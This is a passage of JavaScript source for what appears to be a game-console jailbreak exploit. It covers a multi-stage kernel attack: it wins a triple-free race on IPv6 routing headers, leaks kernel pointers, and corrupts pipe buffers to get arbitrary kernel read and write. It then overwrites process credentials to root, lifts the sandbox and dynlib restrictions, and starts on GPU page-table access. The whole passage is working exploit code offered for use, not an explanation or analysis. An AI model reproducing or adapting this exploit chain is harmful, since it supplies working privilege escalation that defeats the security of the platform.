            for (let i = 0; i < free_fds_num; i++) {
                const fd = new_free_fd();
                if (fd === 0xffffffffffffffffn) fail("free-fd creation failed at i=" + i);
                S.free_fds.push(Number(fd));
            }
            logger.log("feeding complete, stage 0 in 10s");
            syscall(SYSCALL.setuid, 1n);
            nanosleep_ms(10000);
        }

        function free_one_fd(S) {

            if (S.free_fd_idx >= S.free_fds.length)
                fail("free_one_fd: free_fds pool exhausted (idx=" +
                    S.free_fd_idx + "/" + S.free_fds.length + ")");
            syscall(SYSCALL.close, BigInt(S.free_fds[S.free_fd_idx]));
            S.free_fd_idx++;
        }

        function flush_iov_workers(S, count) {
            for (let i = 0; i < count; i++) {
                S.iov_ws.signal();
                syscall(SYSCALL.write, BigInt(S.iov_sock_b), S.scratch_big, 1n);
                S.iov_ws.wait();
                syscall(SYSCALL.read, BigInt(S.iov_sock_a), S.dummy_byte, 1n);
            }
        }

        function attempt_race(S) {

            for (let i = 0; i < S.ipv6_count; i++) rthdr_free_idx(S, i);
            free_one_fd(S);
            flush_iov_workers(S, 32);
            free_one_fd(S);

            const twins = find_twins(S, MAX_ROUNDS_TWIN);
            if (!twins) return false;

            rthdr_free_idx(S, twins[1]);
            sched_yield_n(2);

            const verify_buf = malloc(UCRED_SIZE);
            const verify_len = malloc(4);
            let reclaimed = false;

            for (let k = 0; k < MAX_ROUNDS_TRIPLET; k++) {
                S.iov_ws.signal();
                sched_yield_n(4);
                write32_uncompressed(verify_len, 8n);
                syscall(SYSCALL.getsockopt, BigInt(S.ipv6_sockets[twins[0]]),
                    IPPROTO_IPV6, IPV6_RTHDR, verify_buf, verify_len);
                if (read32_uncompressed(verify_buf) === 1n) {
                    reclaimed = true;
                    break;
                }
                syscall(SYSCALL.write, BigInt(S.iov_sock_b), S.scratch_big, 1n);
                S.iov_ws.wait();
                syscall(SYSCALL.read, BigInt(S.iov_sock_a), S.dummy_byte, 1n);
            }
            if (!reclaimed) return false;

            S.triplets[0] = twins[0];
            free_one_fd(S);
            syscall(SYSCALL.sched_yield);

            S.triplets[1] = find_triplet(S, S.triplets[0], -1, MAX_ROUNDS_TRIPLET);
            if (S.triplets[1] === -1) return false;

            syscall(SYSCALL.write, BigInt(S.iov_sock_b), S.scratch_big, 1n);
            S.triplets[2] = find_triplet(S, S.triplets[0], S.triplets[1], MAX_ROUNDS_TRIPLET);
            S.iov_ws.wait();
            syscall(SYSCALL.read, BigInt(S.iov_sock_a), S.dummy_byte, 1n);
            if (S.triplets[2] === -1) return false;

            return true;
        }

        function stage0(S) {
            logger.log("Stage 0\nTriple-free race");

            // if (failcheck_path) {
            //     try { write_file(failcheck_path, ""); } catch (_) { }
            // }
            for (let attempt = 1; attempt <= TRIPLEFREE_ATTEMPTS; attempt++) {
                if (attempt_race(S)) {
                    logger.log("stage0: triplets " + S.triplets.join(",") +
                        " (attempt " + attempt + "/" + TRIPLEFREE_ATTEMPTS +
                        ")");
                    nanosleep_ms(500);
                    return;
                }
                nanosleep_ms(10);
            }
            fail("stage0: race failed after " + TRIPLEFREE_ATTEMPTS + " attempts");
        }

        function build_uio(buf, iov_ptr, td, is_read, kaddr, size) {
            write64_uncompressed(buf, iov_ptr);
            write64_uncompressed(buf + 8n, UIO_IOV_COUNT);
            write64_uncompressed(buf + 16n, 0xFFFFFFFFFFFFFFFFn);
            write64_uncompressed(buf + 24n, size);
            write32_uncompressed(buf + 32n, UIO_SYSSPACE);
            write32_uncompressed(buf + 36n, is_read ? 1n : 0n);
            write64_uncompressed(buf + 40n, td);
            write64_uncompressed(buf + 48n, kaddr);
            write64_uncompressed(buf + 56n, size);
        }

        function signal_uio(S, mode) {
            S.active_uio_mode = mode;
            (mode === 0 ? S.uio_read_ws : S.uio_write_ws).signal();
        }
        function wait_uio(S) {
            (S.active_uio_mode === 0 ? S.uio_read_ws : S.uio_write_ws).wait();
        }

        function kread_slow(S, kaddr, size) {
            if (!triplets_valid(S)) return null;
            for (let i = 0; i < 64; i += 8) write64_uncompressed(S.uio_read_buf + BigInt(i), 0x4141414141414141n);
            for (let i = 0; i < UIO_THREAD_NUM; i++) {
                for (let j = 0; j < size; j++) write8_uncompressed(S.kread_result_bufs[i] + BigInt(j), 0n);
            }
            write32_uncompressed(S.kread_sndbuf, BigInt(size));
            syscall(SYSCALL.setsockopt, BigInt(S.uio_sock_b), SOL_SOCKET, SO_SNDBUF,
                S.kread_sndbuf, 4n);
            syscall(SYSCALL.write, BigInt(S.uio_sock_b), S.scratch_big, BigInt(size));
            write64_uncompressed(S.uio_iov_read + 8n, BigInt(size));

            if (!triplets_valid(S)) return null;
            rthdr_free_idx(S, S.triplets[1]);
            sched_yield_n(3);

            let leaked_iov = 0n;
            let found = false;
            for (let it = 0; it < 2000; it++) {
                signal_uio(S, 0);
                syscall(SYSCALL.sched_yield);
                write32_uncompressed(S.len_out, 16n);
                syscall(SYSCALL.getsockopt, BigInt(S.ipv6_sockets[S.triplets[0]]),
                    IPPROTO_IPV6, IPV6_RTHDR, S.rthdr_readback, S.len_out);
                if (read32_uncompressed(S.rthdr_readback + 8n) === UIO_IOV_COUNT) { found = true; break; }
                syscall(SYSCALL.read, BigInt(S.uio_sock_a), S.scratch_big, BigInt(size));
                for (let i = 0; i < UIO_THREAD_NUM; i++) {
                    syscall(SYSCALL.read, BigInt(S.uio_sock_a),
                        S.kread_result_bufs[i], BigInt(size));
                }
                wait_uio(S);
                syscall(SYSCALL.write, BigInt(S.uio_sock_b), S.scratch_big, BigInt(size));
            }
            if (!found) return null;
            leaked_iov = read64_uncompressed(S.rthdr_readback);
            if (leaked_iov === 0n || (leaked_iov >> 48n) !== 0xFFFFn) return null;

            build_uio(S.recvmsg_iovecs, leaked_iov, 0n, true, kaddr, BigInt(size));

            if (!triplets_valid(S)) return null;
            rthdr_free_idx(S, S.triplets[2]);
            sched_yield_n(3);

            found = false;
            for (let it = 0; it < 2000; it++) {
                S.iov_ws.signal();
                sched_yield_n(5);
                write32_uncompressed(S.len_out, 64n);
                syscall(SYSCALL.getsockopt, BigInt(S.ipv6_sockets[S.triplets[0]]),
                    IPPROTO_IPV6, IPV6_RTHDR, S.rthdr_readback, S.len_out);
                if (read32_uncompressed(S.rthdr_readback + 32n) === UIO_SYSSPACE) { found = true; break; }
                syscall(SYSCALL.write, BigInt(S.iov_sock_b), S.scratch_big, 1n);
                S.iov_ws.wait();
                syscall(SYSCALL.read, BigInt(S.iov_sock_a), S.dummy_byte, 1n);
            }
            if (!found) return null;

            syscall(SYSCALL.read, BigInt(S.uio_sock_a), S.scratch_big, BigInt(size));
            let result = null;
            for (let i = 0; i < UIO_THREAD_NUM; i++) {
                syscall(SYSCALL.read, BigInt(S.uio_sock_a), S.kread_result_bufs[i], BigInt(size));
                const v = read64_uncompressed(S.kread_result_bufs[i]);
                if (v !== 0x4141414141414141n) {
                    const t = find_triplet(S, S.triplets[0], -1, FIND_TRIPLET_FAST);
                    if (t === -1) {
                        wait_uio(S);
                        syscall(SYSCALL.write, BigInt(S.iov_sock_b), S.scratch_big, 1n);
                        S.iov_ws.wait();
                        syscall(SYSCALL.read, BigInt(S.iov_sock_a), S.dummy_byte, 1n);
                        S.triplets[1] = find_triplet(S, S.triplets[0], S.triplets[2], FIND_TRIPLET_FAST);
                        return null;
                    }
                    S.triplets[1] = t;
                    result = S.kread_result_bufs[i];
                }
            }
            wait_uio(S);
            syscall(SYSCALL.write, BigInt(S.iov_sock_b), S.scratch_big, 1n);
            if (result === null) {
                S.iov_ws.wait();
                syscall(SYSCALL.read, BigInt(S.iov_sock_a), S.dummy_byte, 1n);
                return null;
            }

            for (let k = 0; k < 5; k++) {
                S.triplets[2] = find_triplet(S, S.triplets[0], S.triplets[1], FIND_TRIPLET_FAST);
                if (S.triplets[2] !== -1) break;
                syscall(SYSCALL.sched_yield);
            }
            if (S.triplets[2] === -1) {
                S.iov_ws.wait();
                syscall(SYSCALL.read, BigInt(S.iov_sock_a), S.dummy_byte, 1n);
                return null;
            }
            S.iov_ws.wait();
            syscall(SYSCALL.read, BigInt(S.iov_sock_a), S.dummy_byte, 1n);
            return result;
        }

        function kwrite_slow(S, kaddr, data_addr, data_size) {
            if (!triplets_valid(S)) return false;
            write32_uncompressed(S.kwrite_sndbuf, BigInt(data_size));
            syscall(SYSCALL.setsockopt, BigInt(S.uio_sock_b), SOL_SOCKET, SO_SNDBUF,
                S.kwrite_sndbuf, 4n);
            write64_uncompressed(S.uio_iov_write + 8n, BigInt(data_size));

            if (!triplets_valid(S)) return false;
            rthdr_free_idx(S, S.triplets[1]);
            sched_yield_n(3);

            let leaked_iov = 0n; let found = false;
            for (let it = 0; it < 2000; it++) {
                signal_uio(S, 1);
                syscall(SYSCALL.sched_yield);
                write32_uncompressed(S.len_out, 16n);
                syscall(SYSCALL.getsockopt, BigInt(S.ipv6_sockets[S.triplets[0]]),
                    IPPROTO_IPV6, IPV6_RTHDR, S.rthdr_readback, S.len_out);
                if (read32_uncompressed(S.rthdr_readback + 8n) === UIO_IOV_COUNT) { found = true; break; }
                for (let i = 0; i < UIO_THREAD_NUM; i++) {
                    syscall(SYSCALL.write, BigInt(S.uio_sock_b), data_addr, BigInt(data_size));
                }
                wait_uio(S);
            }
            if (!found) return false;
            leaked_iov = read64_uncompressed(S.rthdr_readback);
            if (leaked_iov === 0n || (leaked_iov >> 48n) !== 0xFFFFn) return false;

            build_uio(S.recvmsg_iovecs, leaked_iov, 0n, false, kaddr, BigInt(data_size));
            if (!triplets_valid(S)) return false;
            rthdr_free_idx(S, S.triplets[2]);
            sched_yield_n(3);

            found = false;
            for (let it = 0; it < 2000; it++) {
                S.iov_ws.signal();
                sched_yield_n(5);
                write32_uncompressed(S.len_out, 64n);
                syscall(SYSCALL.getsockopt, BigInt(S.ipv6_sockets[S.triplets[0]]),
                    IPPROTO_IPV6, IPV6_RTHDR, S.rthdr_readback, S.len_out);
                if (read32_uncompressed(S.rthdr_readback + 32n) === UIO_SYSSPACE) { found = true; break; }
                syscall(SYSCALL.write, BigInt(S.iov_sock_b), S.scratch_big, 1n);
                S.iov_ws.wait();
                syscall(SYSCALL.read, BigInt(S.iov_sock_a), S.dummy_byte, 1n);
            }
            if (!found) return false;

            for (let i = 0; i < UIO_THREAD_NUM; i++) {
                syscall(SYSCALL.write, BigInt(S.uio_sock_b), data_addr, BigInt(data_size));
            }

            for (let k = 0; k < 5; k++) {
                S.triplets[1] = find_triplet(S, S.triplets[0], -1, FIND_TRIPLET_FAST);
                if (S.triplets[1] !== -1) break;
                syscall(SYSCALL.sched_yield);
            }
            if (S.triplets[1] === -1) return false;

            wait_uio(S);
            syscall(SYSCALL.write, BigInt(S.iov_sock_b), S.scratch_big, 1n);

            for (let k = 0; k < 5; k++) {
                S.triplets[2] = find_triplet(S, S.triplets[0], S.triplets[1], FIND_TRIPLET_FAST);
                if (S.triplets[2] !== -1) break;
                syscall(SYSCALL.sched_yield);
            }
            if (S.triplets[2] === -1) return false;

            S.iov_ws.wait();
            syscall(SYSCALL.read, BigInt(S.iov_sock_a), S.dummy_byte, 1n);
            return true;
        }

        function kslow64(S, kaddr) {
            for (let attempt = 0; attempt < 3; attempt++) {
                if (triplets_valid(S)) {
                    const buf = kread_slow(S, kaddr, 8);
                    if (buf !== null) {
                        const val = read64_uncompressed(buf);
                        if (val !== 0n) {
                            if ((val >> 48n) === 0xFFFFn) return val;
                            if ((val >> 40n) !== 0n) return val;
                        }
                    }
                }
                repair_triplets(S); syscall(SYSCALL.sched_yield);
            }
            return null;
        }

        function stage1(S) {
            send_notification("Stage 1\nKqueue reclaim");
            rthdr_free_idx(S, S.triplets[1]);

            let kq = 0n; let proc_filedesc = 0n;
            while (true) {
                kq = syscall(SYSCALL.kqueue);
                write32_uncompressed(S.len_out, 256n);
                syscall(SYSCALL.getsockopt, BigInt(S.ipv6_sockets[S.triplets[0]]),
                    IPPROTO_IPV6, IPV6_RTHDR, S.rthdr_readback, S.len_out);
                if (read32_uncompressed(S.rthdr_readback + 8n) === 0x1430000n) {
                    proc_filedesc = read64_uncompressed(S.rthdr_readback + S.OFF.KQ_FDP);
                    break;
                }
                syscall(SYSCALL.close, kq);
            }
            syscall(SYSCALL.close, kq);
            S.proc_filedesc = proc_filedesc;
            logger.log("stage1: proc_filedesc=" + toHex(proc_filedesc));

            S.triplets[1] = find_triplet(S, S.triplets[0], S.triplets[2], 50000);
            if (S.triplets[1] === -1) fail("stage1: triplet repair failed");
        }

        function stage2(S) {
            send_notification("Stage 2\nLeak pipe data pointers");
            logger.log("stage2: leaking pipe pointers...");

            repair_triplets(S); nanosleep_ms(100);
            const fdescenttbl = kslow64(S, S.proc_filedesc + S.OFF.FILEDESC_OFILES);
            if (!fdescenttbl) fail("stage2: fdescenttbl read failed");
            S.fd_ofiles = fdescenttbl + S.OFF.FDESCENTTBL_HDR;
            repair_triplets(S); nanosleep_ms(500); repair_triplets(S);

            const master_fp = kslow64(S, S.fd_ofiles + BigInt(S.master_rfd) * S.OFF.FILEDESCENT_SIZE);
            if (!master_fp) fail("stage2: master_fp read failed");
            repair_triplets(S); nanosleep_ms(500); repair_triplets(S);

            const victim_fp = kslow64(S, S.fd_ofiles + BigInt(S.victim_rfd) * S.OFF.FILEDESCENT_SIZE);
            if (!victim_fp) fail("stage2: victim_fp read failed");
            repair_triplets(S); nanosleep_ms(500); repair_triplets(S);

            S.master_pipe_data = kslow64(S, master_fp);
            if (!S.master_pipe_data) fail("stage2: master_pipe_data read failed");
            repair_triplets(S); nanosleep_ms(500); repair_triplets(S);

            S.victim_pipe_data = kslow64(S, victim_fp);
            if (!S.victim_pipe_data) fail("stage2: victim_pipe_data read failed");

            if (S.master_pipe_data === S.victim_pipe_data)
                fail("stage2: master_pipe == victim_pipe (aliased - bad leak)");

            logger.log("stage2: master_pipe=" + toHex(S.master_pipe_data) +
                " victim_pipe=" + toHex(S.victim_pipe_data));
        }

        function stage3(S) {
            send_notification("Stage 3\nPipe corruption -> fast kernel R/W");
            logger.log("stage3: corrupting pipe buffer...");

            const pipe_overwrite = malloc(24);
            write32_uncompressed(pipe_overwrite, 0n);
            write32_uncompressed(pipe_overwrite + 4n, 0n);
            write32_uncompressed(pipe_overwrite + 8n, 0n);
            write32_uncompressed(pipe_overwrite + 12n, BigInt(PAGE_SIZE));
            write64_uncompressed(pipe_overwrite + 16n, S.victim_pipe_data);

            nanosleep_ms(100);

            let ok = false;
            for (let attempt = 0; attempt < 40; attempt++) {
                repair_triplets(S);
                if (kwrite_slow(S, S.master_pipe_data, pipe_overwrite, 24)) { ok = true; break; }
                nanosleep_ms(100); syscall(SYSCALL.sched_yield);
            }
            if (!ok) fail("stage3: kwrite_slow failed after 40 attempts");
            syscall(SYSCALL.sched_yield);

            const pipe_cmd = malloc(24);
            const set_victim_pipe = (cnt, inp, out, size, buf_addr) => {
                write32_uncompressed(pipe_cmd, BigInt(cnt));
                write32_uncompressed(pipe_cmd + 4n, BigInt(inp));
                write32_uncompressed(pipe_cmd + 8n, BigInt(out));
                write32_uncompressed(pipe_cmd + 12n, BigInt(size));
                write64_uncompressed(pipe_cmd + 16n, buf_addr);
                syscall(SYSCALL.write, BigInt(S.master_wfd), pipe_cmd, 24n);
                syscall(SYSCALL.read, BigInt(S.master_rfd), pipe_cmd, 24n);
            };

            S.kread = (buf_addr, kaddr, size) => {
                set_victim_pipe(size, 0, 0, PAGE_SIZE, kaddr);
                return syscall(SYSCALL.read, BigInt(S.victim_rfd), buf_addr, BigInt(size));
            };
            S.kwrite = (kaddr, buf_addr, size) => {
                set_victim_pipe(0, 0, 0, PAGE_SIZE, kaddr);
                return syscall(SYSCALL.write, BigInt(S.victim_wfd), buf_addr, BigInt(size));
            };

            for (let i = 0n; i < 64n; i += 8n) write64_uncompressed(S.scratch_big + i, 0n);

            S.kread32 = (k) => { S.kread(S.scratch_big, k, 4); return read32_uncompressed(S.scratch_big); };
            S.kread64 = (k) => { S.kread(S.scratch_big, k, 8); return read64_uncompressed(S.scratch_big); };
            S.kwrite32 = (k, v) => { write32_uncompressed(S.scratch_big, BigInt(v)); S.kwrite(k, S.scratch_big, 4); };
            S.kwrite64 = (k, v) => { write64_uncompressed(S.scratch_big, BigInt(v)); S.kwrite(k, S.scratch_big, 8); };

            let verified = false;
            for (let attempt = 0; attempt < 3; attempt++) {
                if (S.kread64(S.master_pipe_data + 0x10n) === S.victim_pipe_data) {
                    verified = true; break;
                }
                nanosleep_ms(100); repair_triplets(S);
                kwrite_slow(S, S.master_pipe_data, pipe_overwrite, 24);
            }
            if (!verified) fail("stage3: verify failed");
            logger.log("stage3: kernel r/w achieved");

            stage3_cleanup(S);
        }

        function stage3_cleanup(S) {
            logger.log("stage3_cleanup");
            const get_fp = fd => S.kread64(S.fd_ofiles + BigInt(fd) * S.OFF.FILEDESCENT_SIZE);
            const bump = (fp, delta) => {
                const rc = S.kread32(fp + 0x28n);
                if (rc > 0n && rc < 0x10000n) S.kwrite32(fp + 0x28n, Number(rc) + delta);
            };
            const null_rthdr = fd => {
                const fp = S.kread64(S.fd_ofiles + BigInt(fd) * S.OFF.FILEDESCENT_SIZE);
                if (fp === 0n || (fp >> 48n) !== 0xFFFFn) return;
                const f_data = S.kread64(fp);
                if (f_data === 0n || (f_data >> 48n) !== 0xFFFFn) return;
                const so_pcb = S.kread64(f_data + 0x18n);
                if (so_pcb === 0n || (so_pcb >> 48n) !== 0xFFFFn) return;
                const pktopts = S.kread64(so_pcb + S.OFF.INPCB_PKTOPTS);
                if (pktopts === 0n || (pktopts >> 48n) !== 0xFFFFn) return;
                S.kwrite64(so_pcb + S.OFF.INPCB_PKTOPTS, 0n);
            };

            for (const fd of [S.master_rfd, S.master_wfd, S.victim_rfd, S.victim_wfd]) {
                const fp = get_fp(fd);
                if (fp === 0n || (fp >> 48n) !== 0xFFFFn) fail("stage3b: bad fp " + fd);
                bump(fp, 0x100);
            }

            logger.log("stage3_cleanup: sampling ucred");
            if (S.free_fd_idx < S.free_fds.length) {
                const sample_fd = S.free_fds[S.free_fd_idx];
                const sample_fp = S.kread64(S.fd_ofiles + BigInt(sample_fd) * S.OFF.FILEDESCENT_SIZE);
                if (sample_fp !== 0n && (sample_fp >> 48n) === 0xFFFFn) {
                    const fcred = S.kread64(sample_fp + 0x10n);
                    if (fcred !== 0n && (fcred >> 48n) === 0xFFFFn) {
                        S.ucred_A = fcred;
                    }
                }
            }

            logger.log("stage3_cleanup: nulling rthdrs (" + S.ipv6_sockets.length + " sockets)");
            for (const fd of S.ipv6_sockets) null_rthdr(fd);

            logger.log("stage3_cleanup: closing fds");
            for (let i = S.free_fd_idx; i < S.free_fds.length; i++) {
                syscall(SYSCALL.close, BigInt(S.free_fds[i]));
            }
            logger.log("stage3_cleanup: closing sockets");
            for (const fd of S.ipv6_sockets) syscall(SYSCALL.close, BigInt(fd));

            syscall(SYSCALL.close, BigInt(S.iov_sock_a));
            syscall(SYSCALL.close, BigInt(S.iov_sock_b));
            syscall(SYSCALL.close, BigInt(S.uio_sock_a));
            syscall(SYSCALL.close, BigInt(S.uio_sock_b));

            logger.log("stage3_cleanup: signaling workers");
            S.iov_ws.signal();
            S.uio_read_ws.signal();
            S.uio_write_ws.signal();
            syscall(SYSCALL.sched_yield);
            syscall(SYSCALL.sched_yield);

            logger.log("stage3_cleanup: resetting affinity/rtprio");
            for (let i = 0; i < 16; i++) write8_uncompressed(S.cpu_mask + BigInt(i), 0xffn);
            syscall(SYSCALL.cpuset_setaffinity, 3n, 1n, 0xFFFFFFFFFFFFFFFFn, 0x10n, S.cpu_mask);
            write16_uncompressed(S.rt_params, 0n);
            write16_uncompressed(S.rt_params + 2n, 0n);
            syscall(SYSCALL.rtprio_thread, RTP_SET, 0n, S.rt_params);
            nanosleep_ms(30);

            logger.log("stage3_cleanup: workers signalled (D5, left parked)");

            nanosleep_ms(3000);

            {
                const [sr, sw] = create_pipe();
                const sigio_rfd = Number(sr), sigio_wfd = Number(sw);
                const our_pid = syscall(SYSCALL.getpid) & 0xFFFFFFFFn;
                const pid_buf = malloc(4);
                write32_uncompressed(pid_buf, our_pid);
                syscall(SYSCALL.ioctl, BigInt(sigio_rfd), 0x8004667Cn, pid_buf);

                const sigio_fp = S.kread64(S.fd_ofiles +
                    BigInt(sigio_rfd) * S.OFF.FILEDESCENT_SIZE);

                if (sigio_fp === 0n || (sigio_fp >> 48n) !== 0xFFFFn)
                    fail("stage3b: bad sigio fp");

                const sigio_pipe = S.kread64(sigio_fp);

                if (sigio_pipe === 0n || (sigio_pipe >> 48n) !== 0xFFFFn)
                    fail("stage3b: bad sigio pipe");

                const pipe_sigio = S.kread64(sigio_pipe + S.OFF.PIPE_SIGIO);

                if (pipe_sigio === 0n || (pipe_sigio >> 48n) !== 0xFFFFn)
                    fail("stage3b: no sigio");

                const curproc = S.kread64(pipe_sigio);

                if (curproc === 0n || (curproc >> 48n) !== 0xFFFFn)
                    fail("stage3b: bad curproc");

                if (S.kread32(curproc + S.OFF.PROC_PID) !== our_pid)
                    fail("stage3b: pid mismatch");

                syscall(SYSCALL.close, BigInt(sigio_rfd));
                syscall(SYSCALL.close, BigInt(sigio_wfd));

                S.curproc = curproc;
                S.proc_ucred = S.kread64(curproc + S.OFF.PROC_UCRED);
                S.proc_fd = S.kread64(curproc + S.OFF.PROC_FD);
                logger.log("stage3b: curproc=" + toHex(curproc) +
                    " fd=" + toHex(S.proc_fd));
            }

            logger.log("stage3b: race cleanup done");

            nanosleep_ms(3000);
        }

        function stage4(S) {
            send_notification("Stage 4\nFind rootvnode");

            if (!S.curproc || !S.proc_ucred || !S.proc_fd)
                fail("stage4: curproc/proc_ucred/proc_fd missing (should have " +
                    "been set in stage3_cleanup)");
            const curproc = S.curproc;
            logger.log("stage4: using curproc=" + toHex(curproc) +
                " from stage3_cleanup");

            let p = curproc, kernel_proc = null;
            for (let i = 0; i < 1000; i++) {
                if (p === 0n) break;
                if ((p >> 48n) !== 0xFFFFn) break;
                if (S.kread32(p + S.OFF.PROC_PID) === 0n) { kernel_proc = p; break; }
                p = S.kread64(p + 0n);
            }
            if (!kernel_proc) fail("stage4: kernel proc (pid=0) not found");

            const kernel_fd = S.kread64(kernel_proc + S.OFF.PROC_FD);
            if (kernel_fd === 0n || (kernel_fd >> 48n) !== 0xFFFFn)
                fail("stage4: kernel_fd bad: " + toHex(kernel_fd));

            const rootvnode = S.kread64(kernel_fd + S.OFF.FD_CDIR);
            if (rootvnode === 0n || (rootvnode >> 48n) !== 0xFFFFn)
                fail("stage4: rootvnode bad: " + toHex(rootvnode));

            S.rootvnode = rootvnode;
            logger.log("stage4: kernel_proc=" + toHex(kernel_proc) +
                " rootvnode=" + toHex(rootvnode));
        }


        function stage5(S) {
            send_notification("Stage 5\nJailbreak");

            S.kwrite32(S.proc_ucred + S.OFF.UCRED_CR_UID, 0);
            S.kwrite32(S.proc_ucred + S.OFF.UCRED_CR_RUID, 0);
            S.kwrite32(S.proc_ucred + S.OFF.UCRED_CR_SVUID, 0);
            S.kwrite32(S.proc_ucred + S.OFF.UCRED_CR_NGROUPS, 1);
            S.kwrite32(S.proc_ucred + S.OFF.UCRED_CR_RGID, 0);
            S.kwrite32(S.proc_ucred + S.OFF.UCRED_CR_SVGID, 0);

            S.kwrite64(S.proc_ucred + S.OFF.UCRED_CR_SCEAUTHID, SYSTEM_AUTHID);
            S.kwrite64(S.proc_ucred + S.OFF.UCRED_CR_SCECAPS0, 0xFFFFFFFFFFFFFFFFn);
            S.kwrite64(S.proc_ucred + S.OFF.UCRED_CR_SCECAPS1, 0xFFFFFFFFFFFFFFFFn);

            let attrs = S.kread64(S.proc_ucred + 0x80n);
            attrs = (attrs & 0xFFFFFFFF00FFFFFFn) | (0x80n << 24n);
            S.kwrite64(S.proc_ucred + 0x80n, attrs);

            S.kwrite64(S.proc_fd + S.OFF.FD_RDIR, S.rootvnode);
            S.kwrite64(S.proc_fd + S.OFF.FD_JDIR, S.rootvnode);

            if (S.kread32(S.proc_ucred + S.OFF.UCRED_CR_UID) !== 0n) {
                fail("stage5: jailbreak verify failed");
            }
            logger.log("stage5: jailbreak ok");
        }

        function stage6(S) {
            send_notification("Stage 6\nData_base + Debug menu");

            const KDATA_MASK = 0xffff804000000000n;
            let p = S.curproc, allproc = 0n;
            for (let i = 0; i < 64; i++) {
                if (p !== 0n && (p & KDATA_MASK) === KDATA_MASK &&
                    ((p - S.OFF.DATA_BASE_ALLPROC) & 0xfffn) === 0n) {
                    allproc = p; break;
                }
                p = S.kread64(p + 8n);
            }
            if (allproc === 0n) {
                S.data_base_ok = false;
                logger.log("stage6: allproc not found - debug menu + elf " +
                    "loader skipped (jailbreak is done)");
                return;
            }
            const data_base = allproc - S.OFF.DATA_BASE_ALLPROC;
            S.data_base = data_base;
            logger.log("stage6: allproc=" + toHex(allproc) +
                " data_base=" + toHex(data_base));

            let data_base_ok = true;
            const first_proc = S.kread64(allproc);
            const first_proc_ok = (first_proc >> 48n) === 0xFFFFn;
            logger.log("stage6: data_base check - *allproc=" + toHex(first_proc) +
                (first_proc_ok ? "  (kptr OK)" : "  (BAD - not a kptr)"));
            if (!first_proc_ok) data_base_ok = false;

            if (typeof is_jailbroken === "function")
                logger.log("stage6: is_jailbroken() = " + is_jailbroken());
            S.data_base_ok = data_base_ok;
            if (!data_base_ok) {
                logger.log("stage6: data_base check FAILED - skipping the debug " +
                    "menu and the elf loader. The jailbreak is complete.");
                return;
            }

            if (ENABLE_DEBUG_MENU) {
                stage_debug_menu(S);
            } else {
                logger.log("stage6: debug menu DISABLED (ENABLE_DEBUG_MENU=false)");
            }
        }

       function stage7(S) {
            logger.log("Stage 7\nFinalize: dynlib restrictions");

            const is_kptr = (v) =>
                (v & 0xFFFF000000000000n) === 0xFFFF000000000000n;

            const p_dynlib = S.kread64(S.curproc + 0x3E8n);

            if (!is_kptr(p_dynlib))
                throw new Error("p_dynlib not a kptr: " + toHex(p_dynlib));

            S.kwrite32(p_dynlib + 0x118n, 0);
            S.kwrite64(p_dynlib + 0x18n, 1n);

            S.kwrite64(p_dynlib + 0xF0n, 0n);
            S.kwrite64(p_dynlib + 0xF8n, 0xFFFFFFFFFFFFFFFFn);

            const dynlib_eboot = S.kread64(p_dynlib + 0x00n);

            if (!is_kptr(dynlib_eboot))
                throw new Error("dynlib_eboot not a kptr: " + toHex(dynlib_eboot));

            const eboot_segments = S.kread64(dynlib_eboot + 0x40n);

            if (!is_kptr(eboot_segments))
                throw new Error("eboot_segments not a kptr: " + toHex(eboot_segments));

            S.kwrite64(eboot_segments + 0x08n, 0n);
            S.kwrite64(eboot_segments + 0x10n, 0xFFFFFFFFFFFFFFFFn);
            logger.log("stage7: dynlib patched " +
                "(syscalls + dlsym unrestricted, dynlib=" +
                toHex(p_dynlib) + ")");

            logger.log("stage7: dynlib maximized; jailbreak fully finalized");
            send_notification(p2jb_version + "\nFW=" + FW_VERSION + "\nJailbroken");
        }

        const GPU_PDE_SHIFT = { VALID: 0, IS_PTE: 54, TF: 56, BLOCK_FRAGMENT_SIZE: 59 };
        const GPU_PDE_MASKS = { VALID: 1n, IS_PTE: 1n, TF: 1n, BLOCK_FRAGMENT_SIZE: 0x1fn };
        const GPU_PDE_ADDR_MASK = 0x0000ffffffffffc0n;

        function gpu_pde_field(pde, field) {
            return (pde >> BigInt(GPU_PDE_SHIFT[field])) & GPU_PDE_MASKS[field];
        }

        function gpu_walk_pt(vmid, virt_addr) {
            const pdb2_addr = get_pdb2_addr(vmid);
            const pml4e_index = (virt_addr >> 39n) & 0x1ffn;
            const pdpe_index = (virt_addr >> 30n) & 0x1ffn;
            const pde_index = (virt_addr >> 21n) & 0x1ffn;

            const pml4e = kernel.read_qword(pdb2_addr + pml4e_index * 8n);
            if (gpu_pde_field(pml4e, "VALID") !== 1n) return null;

            const pdp_base_pa = pml4e & GPU_PDE_ADDR_MASK;
            const pdpe_va = phys_to_dmap(pdp_base_pa) + pdpe_index * 8n;
            const pdpe = kernel.read_qword(pdpe_va);
            if (gpu_pde_field(pdpe, "VALID") !== 1n) return null;

            const pd_base_pa = pdpe & GPU_PDE_ADDR_MASK;
            const pde_va = phys_to_dmap(pd_base_pa) + pde_index * 8n;
            const pde = kernel.read_qword(pde_va);
            if (gpu_pde_field(pde, "VALID") !== 1n) return null;
            if (gpu_pde_field(pde, "IS_PTE") === 1n) return [pde_va, 0x200000n];

            const fragment_size = gpu_pde_field(pde, "BLOCK_FRAGMENT_SIZE");
            const offset = virt_addr & 0x1fffffn;
            const pt_base_pa = pde & GPU_PDE_ADDR_MASK;
            let pte_index, pte, pte_va, page_size;

            if (fragment_size === 4n) {
                pte_index = offset >> 16n;
                pte_va = phys_to_dmap(pt_base_pa) + pte_index * 8n;
                pte = kernel.read_qword(pte_va);
                if (gpu_pde_field(pte, "VALID") === 1n && gpu_pde_field(pte, "TF") === 1n) {
                    pte_index = (virt_addr & 0xffffn) >> 13n;
                    pte_va = phys_to_dmap(pt_base_pa) + pte_index * 8n;
                    page_size = 0x2000n;
                } else {
                    page_size = 0x10000n;
                }
            } else if (fragment_size === 1n) {
                pte_index = offset >> 13n;
                pte_va = phys_to_dmap(pt_base_pa) + pte_index * 8n;
                page_size = 0x2000n;
            }
            return [pte_va, page_size];
        }

        let gpu = {};
        gpu.dmem_size = 2n * 0x100000n;
        gpu.fd = null;

        gpu.build_command_descriptor = function (gpu_addr, size_in_bytes) {
            const desc = malloc(16);
            const size_in_dwords = BigInt(size_in_bytes) >> 2n;
            const qword0 = ((gpu_addr & 0xFFFFFFFFn) << 32n) | 0xC0023F00n;
            const qword1 = ((size_in_dwords & 0xFFFFFn) << 32n) | ((gpu_addr >> 32n) & 0xFFFFn);
            write64_uncompressed(desc, qword0);
